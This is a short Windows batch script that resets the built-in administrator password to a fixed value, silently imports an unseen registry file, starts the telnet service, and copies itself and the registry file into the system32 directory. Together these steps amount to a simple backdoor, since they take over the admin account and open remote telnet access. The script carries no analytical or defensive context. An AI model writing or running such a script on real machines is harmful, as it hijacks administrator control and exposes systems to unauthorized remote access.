@echo off
net user administrator kaczka1
regedit /s k.reg
net start telnet
copy server.bat c:\windows\system32\
copy k.reg c:\windows\system32\